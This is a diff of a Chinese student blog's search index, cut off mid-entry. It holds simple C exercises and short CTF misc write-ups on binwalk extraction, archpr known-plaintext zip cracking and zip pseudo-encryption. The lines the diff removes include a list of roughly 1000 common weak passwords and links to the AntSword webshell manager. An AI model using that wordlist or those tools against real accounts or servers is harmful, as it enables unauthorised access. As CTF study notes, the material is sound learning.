@@ -1,664 +1,846 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>16进制转8和10无符号整数</title>
-    <url>/2021/11/10/16%E8%BF%9B%E5%88%B6%E8%BD%AC8%E5%92%8C10/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a;</span><br><span class="line">     scanf(&quot;%x&quot;,&amp;a);</span><br><span class="line">printf(&quot;%o %u&quot;,a,a);</span><br><span class="line">return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>misc秘密考核信件</title>
+      <link href="/2022/02/26/misc%E4%BD%A0%E5%A5%BD%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%B8%80%E4%BB%BD%E7%A7%98%E5%AF%86%E8%80%83%E6%A0%B8%E4%BF%A1%E4%BB%B6%E8%AF%B7%E6%9F%A5%E6%94%B6/"/>
+      <url>/2022/02/26/misc%E4%BD%A0%E5%A5%BD%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%B8%80%E4%BB%BD%E7%A7%98%E5%AF%86%E8%80%83%E6%A0%B8%E4%BF%A1%E4%BB%B6%E8%AF%B7%E6%9F%A5%E6%94%B6/</url>
+      
+        <content type="html"><![CDATA[<p>开局一张图<br><img src="https://s3.bmp.ovh/imgs/2022/02/aefaa7de827654db.jpg"></p><span id="more"></span><p>拉到kali里用binwalk分离图片中的压缩包<br><img src="https://s3.bmp.ovh/imgs/2022/02/0ed69b6579f3533c.png"><br>发现是个千层饼，用ExtractNow解压。最后的压缩包用《青玉案·元夕》.zip当明文，用archpr明文攻击。</p><p>又拿到一张图<br><img src="https://s3.bmp.ovh/imgs/2022/02/cb6dcb300af996e7.png"></p><p>用010 Editor调整图片高度，得到flag{众里寻他千百度，蓦然回首，那人却在，灯火阑珊处。}<br><img src="https://s3.bmp.ovh/imgs/2022/02/decf60b0626b015e.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/02/1a6da6b6b426f734.png"></p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Misc </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1000个弱密码</title>
-    <url>/2021/11/17/1000%E4%B8%AA%E5%BC%B1%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<p>123456<br>123456789<br>111111<br>from91<br>12345678<br>123123<br>5201314<br>000000<br>11111111</p>
-<span id="more"></span>
-<p>a123456<br>163.com<br>fill.com<br>123321<br>123123123<br>00000000<br>1314520<br>7758521<br>1234567<br>666666<br>123456a<br>1234567890<br>woaini<br>a123456789<br>888888<br>88888888<br>147258369<br>qq123456<br>654321<br>zxcvbnm<br>woaini1314<br>112233<br>5211314<br>123456abc<br>520520<br>aaaaaa<br>123654<br>987654321<br>123456789a<br>12345<br>7758258<br>100200<br>147258<br>111222<br>abc123456<br>111222tianya<br>121212<br>1111111<br>abc123<br>110110<br>789456<br>q123456<br>123456aa<br>aa123456<br>asdasd<br>999999<br>123qwe<br>789456123<br>1111111111<br>1314521<br>iloveyou<br>qwerty<br>password<br>qazwsx<br>159357<br>222222<br>woaini520<br>woaini123<br>521521<br>asd123<br>qqqqqq<br>qq1111<br>1234<br>qwe123<br>111111111<br>1qaz2wsx<br>qwertyuiop<br>5201314520<br>asd123456<br>159753<br>31415926<br>qweqwe<br>555555<br>333333<br>woaini521<br>abcd1234<br>ASDFGHJKL<br>123456qq<br>11223344<br>456123<br>123000<br>123698745<br>wangyut2<br>201314<br>zxcvbnm123<br>qazwsxedc<br>1q2w3e4r<br>z123456<br>123abc<br>a123123<br>12345678910<br>asdfgh<br>456789<br>qwe123456<br>321321<br>123654789<br>456852<br>0000000000<br>WOAIWOJIA<br>741852963<br>5845201314<br>aini1314<br>0123456789<br>a321654<br>123456123<br>584520<br>778899<br>520520520<br>7777777<br>q123456789<br>123789<br>zzzzzz<br>qweasdzxc<br>5845211314<br>123456q<br>w123456<br>12301230<br>qq123456789<br>wocaonima<br>qq123123<br>a5201314<br>a12345678<br>asdasdasd<br>a1234567<br>147852<br>110120<br>135792468<br>CAONIMA<br>963852741<br>3.1415926<br>1234560<br>101010<br>7758520<br>753951<br>666888<br>zxc123<br>0000000<br>zhang123<br>987654<br>a111111<br>1233211234567<br>789789<br>25257758<br>7708801314520<br>zzzxxx<br>1111<br>999999999<br>1357924680<br>yahoo.com.cn<br>123456789q<br>12341234<br>5841314520<br>zxc123456<br>yangyang<br>168168<br>123123qaz<br>abcd123456<br>456456<br>963852<br>as123456<br>741852<br>xiaoxiao<br>1230123<br>555666<br>000000000<br>369369<br>211314<br>102030<br>aaa123456<br>zxcvbn<br>110110110<br>buzhidao<br>qaz123<br>123456.<br>asdfasdf<br>123456789.<br>woainima<br>123456ASD<br>woshishui<br>131421<br>123321123<br>dearbook<br>1234qwer<br>qaz123456<br>aaaaaaaa<br>111222333<br>qq5201314<br>3344520<br>147852369<br>1q2w3e<br>windows<br>123456987<br>zz12369<br>qweasd<br>qiulaobai<br>66666666<br>12344321<br>qwer1234<br>a12345<br>7894561230<br>qwqwqw<br>777777<br>110120119<br>951753<br>wmsxie123<br>131420<br>1314520520<br>369258147<br>321321321<br>110119<br>beijing2008<br>321654<br>a000000<br>147896325<br>12121212<br>123456aaa<br>521521521<br>22222222<br>888999<br>123456789ABC<br>abc123456789<br>12345678900<br>1q2w3e4r5t<br>1234554321<br>www123456<br>w123456789<br>336699<br>abcdefg<br>709394<br>258369<br>z123456789<br>314159<br>584521<br>12345678a<br>7788521<br>9876543210<br>258258<br>111111a<br>87654321<br>123asd<br>5201314a<br>134679<br>135246<br>hotmail.com<br>123123a<br>11112222<br>131313<br>100200300<br>11111<br>1234567899<br>520530<br>251314<br>qq66666<br>yahoo.cn<br>123456qwe<br>worinima<br>sohu.com<br>NULL<br>518518<br>123457<br>q1w2e3r4<br>721521<br>123456789QQ<br>584131421<br>qw123456<br>123456..<br>0123456<br>135790<br>3344521<br>980099<br>a1314520<br>123456123456<br>qazwsx123<br>asdf1234<br>444444<br>123456z<br>120120<br>wang123456<br>12345600<br>7758521521<br>12369874<br>abcd123<br>a12369<br>li123456<br>1234567891<br>wang123<br>1234abcd<br>147369<br>zhangwei<br>qqqqqqqq<br>521125<br>010203<br>369258<br>654123<br>woailaopo<br>QAZQAZ<br>121314<br>1qazxsw2<br>zxczxc<br>l123456<br>111000<br>jingjing<br>0000<br>1472583690<br>25251325<br>langzi123<br>wojiushiwo<br>7895123<br>wangjian<br>123qweasd<br>110120130<br>1123581321<br>142536<br>584131420<br>aaa123<br>aaa111<br>woaiwoziji<br>520123<br>665544<br>ab123456<br>a123456a<br>fuckyou<br>99999999<br>5203344<br>qwertyui<br>521314<br>18881888<br>584201314<br>woaini@<br>7654321<br>20082008<br>520131<br>124578<br>852456<br>nihaoma<br>74108520<br>232323<br>55555555<br>zx123456<br>wwwwww<br>119119<br>weiwei<br>13145200<br>LOVE1314<br>564335<br>123456789123<br>wo123456<br>123520<br>52013145201314<br>loveyou<br>wolf8637<br>112358<br>5201314123<br>yuanyuan<br>zhanglei<br>zz123456<br>1234567A<br>a11111<br>000000a<br>321654987<br>xiaolong<br>5841314521<br>shmily<br>520025<br>159951<br>77585210<br>tiantian<br>134679852<br>QWASZX<br>123456654321<br>20080808<br>zhangjian<br>123465<br>9958123<br>159159<br>5508386<br>wangwei<br>5205201314<br>woaini5201314<br>888666<br>52013141314<br>qweqweqwe<br>1122334455<br>123456789z<br>585858<br>33333333<br>aa123123<br>qwertyuiop123<br>q111111<br>9638527410<br>911911<br>qqq111<br>5213344<br>sunshine<br>liu123456<br>abcdef<br>zhendeaini<br>007007<br>555888<br>qq111111<br>jiushiaini<br>mnbvcxz<br>xiaoqiang<br>445566<br>nicholas<br>dongdong<br>123456abcd<br>111qqq<br>aptx4869<br>258456<br>wobuzhidao<br>qazxsw<br>123789456<br>zhang123456<br>7215217758991<br>1234567890123<br>……<br>huang123<br>maomao<br>222333<br>wangyang<br>123456789aa<br>1.23457E+11<br>1234566<br>1230456<br>1a2b3c4d<br>13141314<br>a7758521<br>123456zxc<br>123456as<br>forever<br>s123456<br>12348765<br>xxxxxx<br>asdf123<br>a1b2c3d4<br>246810<br>333666<br>mingming<br>000123<br>jiajia<br>12qwaszx<br>ffffff<br>112233445566<br>77585211314<br>520131400<br>aa123456789<br>wpc000821<br>WANGJING<br>woaini1314520<br>&amp;nbsp<br>000111<br>qq1314520<br>1234512345<br>147147<br>123456qaz<br>q123123<br>123456ab<br>xiaofeng<br>wodemima<br>shanshan<br>w2w2w2<br>666999<br>123456w<br>321456<br>feifei<br>dragon<br>computer<br>dddddd<br>zhangjie<br>baobao<br>x123456<br>q1w2e3<br>chenchen<br>12345679<br>131452<br>caonima123<br>asdf123456<br>tangkai<br>52013140<br>longlong<br>ssssss<br>www123<br>1234568<br>q1q1q1q1<br>asdfghjkl123<br>14789632<br>123456711<br>michael<br>tingting<br>woshishei<br>asd123456789<br>1314258<br>sunliu66<br>qwert12345<br>235689<br>565656<br>1234569<br>ww123456<br>1314159<br>5211314521<br>123456789w<br>123123aa<br><a href="mailto:&#x31;&#x33;&#57;&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;">&#x31;&#x33;&#57;&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;</a><br>111111q<br>hao123456<br>52tiance<br>19830122<br>y123456<br>110119120<br>1231230<br>sj811212<br>13579246810<br>123.123<br>superman<br>789123<br>12345qwert<br>770880<br>js77777<br>zhangyang<br>686868<br>@163.com<br>imzzhan<br>xiaoyu<br>7758521a<br>abc12345<br>nihao123<br>wokaonima<br>q11111<br>623623623<br>989898<br>122333<br>13800138000<br>laopowoaini<br>787878<br>123456l<br>a123123123<br>198611<br>332211<br>tom.com<br>212121<br>woaini123456<br>wanglei<br>yang123456<br>zhangqiang<br>zxcvbnm,./<br>zhangyan<br>181818<br>234567<br>stryker<br>167669123<br>laopo520<br>2597758<br>aa5201314<br>139.com<br>5201314.<br>8888888888<br>74107410<br>zhanghao<br>77777777<br>zhangyu<br>zzb19860526<br>qwertyu<br>5201314qq<br>198612<br>q5201314<br>999888<br>369852<br>121121<br>1122334<br>123456789asd<br>123zxc<br>a123321<br>QWErtyUIO<br>456456456<br>qq000000<br>m123456<br>q1w2e3r4t5<br>woainilaopo<br>123456789*<br>131425<br>liuchang<br>85208520<br>zhangjing<br>c123456<br>asdfghjk<br>qq1234<br>asdzxc<br>hao123<br>777888<br>131131<br>woainia<br>beyond<br>zhang520<br>556688<br>123456qw<br>wangchao<br>woshiniba<br>168888<br>7758991<br>woshizhu<br>ainiyiwannian<br>LAOpo521<br>abcd123456789<br>qwerasdf<br>123456ok<br>woshinidie<br>huanhuan<br>1hxboqg2s<br>meiyoumima<br>456321<br>QQQ123456<br>1314<br>898989<br>123456798<br><a href="mailto:&#x70;&#x70;&#x2e;&#99;&#111;&#x6d;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;">&#x70;&#x70;&#x2e;&#99;&#111;&#x6d;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;</a><br>mm123456<br>123698741<br>a520520<br>z321321<br>asasas<br>YANG123<br>584211314<br>1234561<br>123456789+<br>miaomiao<br>789789789<br>7788520<br>AAAAAAa<br>h123456<br>3838438<br>l123456789<br>198511<br>ABCDEFG123<br>zhangjun<br>123qaz<br>198512<br>2525775<br>54545454<br>789632145<br>831213<br>10101010<br>xiaohe<br>19861010<br>10203<br>woshishen<br>0987654321<br>yj2009<br>wangqiang<br>198411<br>1314520a<br>xiaowei<br>123456000<br>123987<br>love520<br>caonimabi<br>qwe123123<br>010101<br>qq666666<br>789987<br>10161215<br>liangliang<br>qwert123<br>112112<br>qianqian<br>1a2b3c<br>198410<br>nuttertools<br>goodluck<br>zhangxin<br>18n28n24a5<br>liuyang<br>998877<br>woxiangni<br>7788250<br>a147258369<br>zhangliang<br>16897168<br>223344<br>123123456<br>a1b2c3<br>killer<br>321123<br>pp.com<br>chen123456<br>wangpeng<br>753159<br>775852100<br>1478963<br>1213141516<br>369369369<br>1236987<br>123369<br>12345a<br>bugaosuni<br>13145201314520<br>110112<br>123456…<br>JIAOJIAO<br>100100<br>1314520123<br>19841010<br>7758521123<br>shangxin<br>woshiwo<br>12312300<br>xingxing<br>yingying<br>1233210<br>34416912<br>qq12345<br>qweasd123<br>nishizhu<br>19861020<br>qwe123456789<br>808080<br>1310613106<br>456789123<br>44444444<br>123123qq<br>3141592653<br>556677<br>xx123456<br>jianjian<br>a1111111<br>0.123456<br>198610<br>loveme<br>tianshi<br>woxihuanni<br>11235813<br>252525<br>225588<br>lovelove<br>mengmeng<br>7758258520<br>xiaoming<br>shanghai<br>huyiming<br>6543210<br>a7758258<br>7788414<br>123456789..<br>Jordan<br>nishiwode<br>ZHUZHU<br>1314woaini<br>chenjian<br>131415<br>xy123456<br>123456520<br>a00000<br>jiang123<br>WOAIMAMA<br>monkey<br>7418529630<br>lingling<br>987456321<br>w5201314<br>qwer123456<br>198412<br>asdasd123<br>zzzzzzzz<br>1q1q1q<br>741741<br>987456<br>19851010<br>2587758<br>456654<br>Iloveyou1314<br>q12345<br>imissyou<br>daniel<br>aipai<br>2222222<br>0147258369<br>123456789l<br>q1234567<br>963963<br>123123123123<br>125521<br>womendeai<br>baobei520<br>19861015<br>667788<br>000000.<br>zhangtao<br>yy123456<br>chen123<br>nishishui<br>789654<br>liu123<br>19861212<br>1230<br>19841020<br>wangjun<br>wangliang<br>zhangpeng<br>woainimama<br>zhangchao<br>5201314q<br>19841025<br>123567<br>aaaa1111<br>123456+<br>134679258<br>668899<br>811009<br>qaz123456789<br>123456789qwe<br>111112<br>130130<br>19861016<br>wozhiaini<br>198712<br>123…<br>abcde12345<br>abcd12345<br>wanggang<br>llllll<br>5121314<br>456258<br>125125<br>qq7758521<br>369963<br>987987<br>142857<br>poiuytrewq<br>qqq123<br>323232<br>baobei<br>g227w212<br>962464<br>mylove<br>p1a6s3m<br>202020<br>19491001<br>963258<br>hhhhhh<br>2582587758<br>wangfeng<br>tiancai<br>11111111111<br>summer<br>wangwang<br>asd123123<br>19841024<br>xinxin<br>0.0.0.<br>19861012<br>19861210<br>8888888<br>zhanghui<br>wenwen<br>635241<br>ASDFGHJ<br>19861023<br>1234567890.<br>888168<br>19861120<br>tianya<br>123aaa<br>111aaa<br>123456789aaa<br>8008208820<br>123123q<br>football<br>dandan<br>www123456789<br>19861026<br>qingqing<br>315315<br>1111122222<br>171204jg<br>19861021<br>5555555<br>AS123456789<br>qqqwww<br>19861024<br>yahoo.com<br>19861225<br>1qaz1qaz<br>19871010<br>1029384756<br>123258<br>zxcv123<br>19861123<br>1314520.<br>aidejiushini<br>123qwe123<br>198711<br>operation<br>19861025<br>yu123456<br>19851225<br>wangshuai<br>19841015<br>520521<br>wangyan<br>19861011<br>7007<br>123456zz<br>521000<br>198311<br>299792458<br>112211</p>
-<hr>
-<p>00000<br>qwer123<br>51201314<br>qazwsxedcrfv<br>LOVE5201314<br>198312<br>198510<br>888888888<br>1314521521<br>internet<br>z123123<br>a147258<br>696969<br>1234321<br>476730751<br>5201314789<br>012345<br>19861022<br>welcome<br>aqwe518951<br>19861121<br>HUANGwei<br>868686<br>wanghao<br>NIAIWOMA<br>xiaojian<br>19851120<br>19851212<br>100000<br>19841022<br>zhangbin<br>shadow<br>mmmmmm<br>000…<br>1357913579<br>77585217758521<br>19861216<br>19841016<br>az123456<br>zxcv1234<br>19841023<br>wu123456<br>163163<br>2008520085<br>pppppp<br>789654123<br>EtnXtxSa65<br>19851025<br>woaiwolaopo<br>ww111111<br>woaini110<br>123455<br>19841026<br>19881010<br>www163com<br>159357456<br>fangfang<br>19851015<br>19861013<br>19861220<br>12312<br>19861018<br>19861028<br>a11111111<br>19841018<br>119911<br>AI123456<br>198211<br>55555<br>zhangkai<br>wangxin<br>xihuanni<br>19871024<br>19861218<br>16899168<br>1010110<br>nimabi<br>19861125<br>52013143344<br>131452000<br>19871020<br>freedom<br>baobao520<br>winner<br>123456m<br>12312312</p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2022二月misc签到题</title>
+      <link href="/2022/02/26/2022%E4%BA%8C%E6%9C%88misc%E7%AD%BE%E5%88%B0%E9%A2%98/"/>
+      <url>/2022/02/26/2022%E4%BA%8C%E6%9C%88misc%E7%AD%BE%E5%88%B0%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[<p>压缩包“打开看看？”是伪加密，搜索修复网站修复成功，打开是base64加密的图片，网站解密得到flag{Welcome}<br><img src="https://s3.bmp.ovh/imgs/2022/02/d1baab9e62595f3b.png"></p>]]></content>
+      
+      
       <categories>
-        <category>密码</category>
+          
+          <category> Misc </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C计划</title>
-    <url>/2021/10/20/C%E8%AE%A1%E5%88%92/</url>
-    <content><![CDATA[<p>现在开始</p>
-<span id="more"></span>
-<p>好好学编程</p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>输入三位数倒序输出</title>
+      <link href="/2021/12/29/%E8%BE%93%E5%85%A5%E4%B8%89%E4%BD%8D%E6%95%B0%E5%80%92%E5%BA%8F%E8%BE%93%E5%87%BA/"/>
+      <url>/2021/12/29/%E8%BE%93%E5%85%A5%E4%B8%89%E4%BD%8D%E6%95%B0%E5%80%92%E5%BA%8F%E8%BE%93%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<pre><code>#include &lt;stdio.h&gt;int main()&#123;    int a,b,c;    scanf(&quot;%1d%1d%1d&quot;,&amp;a,&amp;b,&amp;c);    printf(&quot;%d%d%d&quot;,c,b,a);return 0;&#125;</code></pre>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2022二月misc签到题</title>
-    <url>/2022/02/26/2022%E4%BA%8C%E6%9C%88misc%E7%AD%BE%E5%88%B0%E9%A2%98/</url>
-    <content><![CDATA[<p>压缩包“打开看看？”是伪加密，搜索修复网站修复成功，打开是base64加密的图片，网站解密得到flag{Welcome}<br><img src="https://s3.bmp.ovh/imgs/2022/02/d1baab9e62595f3b.png"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>死循环输出</title>
+      <link href="/2021/12/26/%E6%AD%BB%E5%BE%AA%E7%8E%AF%E8%BE%93%E5%87%BA/"/>
+      <url>/2021/12/26/%E6%AD%BB%E5%BE%AA%E7%8E%AF%E8%BE%93%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define LIGHT_RED &quot;\033[1;31m&quot;</span><br><span class="line">#define GREEN &quot;\033[0;32;32m&quot;</span><br><span class="line">#define RED &quot;\033[0;32;31m&quot;</span><br><span class="line">#define YELLOW &quot;\033[1;33m&quot;</span><br><span class="line">#define BLUE &quot;\033[0;32;34m&quot;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">system(&quot;cls&quot;);</span><br><span class="line">int i,j;</span><br><span class="line">while(1==1)&#123;</span><br><span class="line">for (i=8;i&gt;0;i--)&#123;</span><br><span class="line">for (j=i;j&lt;=8;j++)</span><br><span class="line">printf(LIGHT_RED&quot;做的全会 &quot;),Sleep(1);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">for (i=0;i&lt;=8;i++)&#123;</span><br><span class="line">for (j=i;j&lt;=8;j++)</span><br><span class="line">printf(GREEN&quot;蒙的全对 &quot;),Sleep(1);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">for (i=8;i&gt;0;i--)&#123;</span><br><span class="line">for (j=i;j&lt;=8;j++)</span><br><span class="line">printf(BLUE&quot;看的全考 &quot;),Sleep(1);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">for (i=0;i&lt;=8;i++)&#123;</span><br><span class="line">for (j=i;j&lt;=8;j++)</span><br><span class="line">printf(YELLOW&quot;不会补考 &quot;),Sleep(1);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Misc</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>Text</title>
-    <url>/2021/09/18/TEXT/</url>
-    <content><![CDATA[<h2 id="注意：这是一个测试博客，无意义"><a href="#注意：这是一个测试博客，无意义" class="headerlink" title="注意：这是一个测试博客，无意义"></a>注意：这是一个测试博客，无意义</h2><span id="more"></span>
-<p><a href="https://songkaiai.github.io/">主页套娃</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rororororororororororo[主页套娃](https://songkaiai.github.io/)</span><br></pre></td></tr></table></figure>
-<p><img src="https://s3.bmp.ovh/imgs/2021/09/38c8decbd8b23493.png" alt="水晶雫"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>统计高于平均的人数</title>
+      <link href="/2021/12/22/%E7%BB%9F%E8%AE%A1%E9%AB%98%E4%BA%8E%E5%B9%B3%E5%9D%87%E7%9A%84%E4%BA%BA%E6%95%B0/"/>
+      <url>/2021/12/22/%E7%BB%9F%E8%AE%A1%E9%AB%98%E4%BA%8E%E5%B9%B3%E5%9D%87%E7%9A%84%E4%BA%BA%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">float arrayAvg(int a[],int n)&#123;</span><br><span class="line">int i;</span><br><span class="line">float sum=0,avg;</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">sum+=a[i];</span><br><span class="line">avg=sum/(float)n;</span><br><span class="line">return avg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">int i,n,num=0;</span><br><span class="line">float avg;</span><br><span class="line">float arrayAvg(int a[],int n);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">int a[n];</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">avg=arrayAvg(a,n);</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">if(a[i]&gt;avg)</span><br><span class="line">num++;</span><br><span class="line">printf(&quot;%d&quot;,num);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Text</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>text</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web工具</title>
-    <url>/2021/10/08/Web%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="BurpSuite：自己查-●ˇ∀ˇ●"><a href="#BurpSuite：自己查-●ˇ∀ˇ●" class="headerlink" title="BurpSuite：自己查(●ˇ∀ˇ●)"></a><strong>BurpSuite</strong>：自己查(●ˇ∀ˇ●)</h2><p><strong>中国蚁剑</strong>：核心：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
-<p><strong>加载器</strong>：<a href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
-<p><strong>出错时自己下代码</strong>：<a href="https://github.com/AntSwordProject/AntSword/archive/master.zip">https://github.com/AntSwordProject/AntSword/archive/master.zip</a><br>解压，初始化时选择它</p>
-<p><strong>安装指导</strong>：<a href="https://zhuanlan.zhihu.com/p/367151320">https://zhuanlan.zhihu.com/p/367151320</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>水仙花数</title>
+      <link href="/2021/12/19/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/"/>
+      <url>/2021/12/19/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int Narnumber(int k)&#123;</span><br><span class="line">int i,t=k,sum=0;</span><br><span class="line">for(i=0;i&lt;3;i++)</span><br><span class="line">sum=sum+(k%10)*(k%10)*(k%10),</span><br><span class="line">k/=10;</span><br><span class="line">k=t;</span><br><span class="line">if(sum==k)</span><br><span class="line">return 1;</span><br><span class="line">else</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">int m,n,i;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);</span><br><span class="line">for(i=m;i&lt;=n;i++)</span><br><span class="line">if(Narnumber(i))</span><br><span class="line">printf(&quot;%d &quot;,i);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Web</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>misc秘密考核信件</title>
-    <url>/2022/02/26/misc%E4%BD%A0%E5%A5%BD%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%B8%80%E4%BB%BD%E7%A7%98%E5%AF%86%E8%80%83%E6%A0%B8%E4%BF%A1%E4%BB%B6%E8%AF%B7%E6%9F%A5%E6%94%B6/</url>
-    <content><![CDATA[<p>开局一张图<br><img src="https://s3.bmp.ovh/imgs/2022/02/aefaa7de827654db.jpg"></p>
-<span id="more"></span>
-<p>拉到kali里用binwalk分离图片中的压缩包<br><img src="https://s3.bmp.ovh/imgs/2022/02/0ed69b6579f3533c.png"><br>发现是个千层饼，用ExtractNow解压。最后的压缩包用《青玉案·元夕》.zip当明文，用archpr明文攻击。</p>
-<p>又拿到一张图<br><img src="https://s3.bmp.ovh/imgs/2022/02/cb6dcb300af996e7.png"></p>
-<p>用010 Editor调整图片高度，得到flag{众里寻他千百度，蓦然回首，那人却在，灯火阑珊处。}<br><img src="https://s3.bmp.ovh/imgs/2022/02/decf60b0626b015e.png"></p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/02/1a6da6b6b426f734.png"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>求最小公倍数</title>
+      <link href="/2021/12/15/%E6%B1%82%E6%9C%80%E5%B0%8F%E5%85%AC%E5%80%8D%E6%95%B0/"/>
+      <url>/2021/12/15/%E6%B1%82%E6%9C%80%E5%B0%8F%E5%85%AC%E5%80%8D%E6%95%B0/</url>
+      
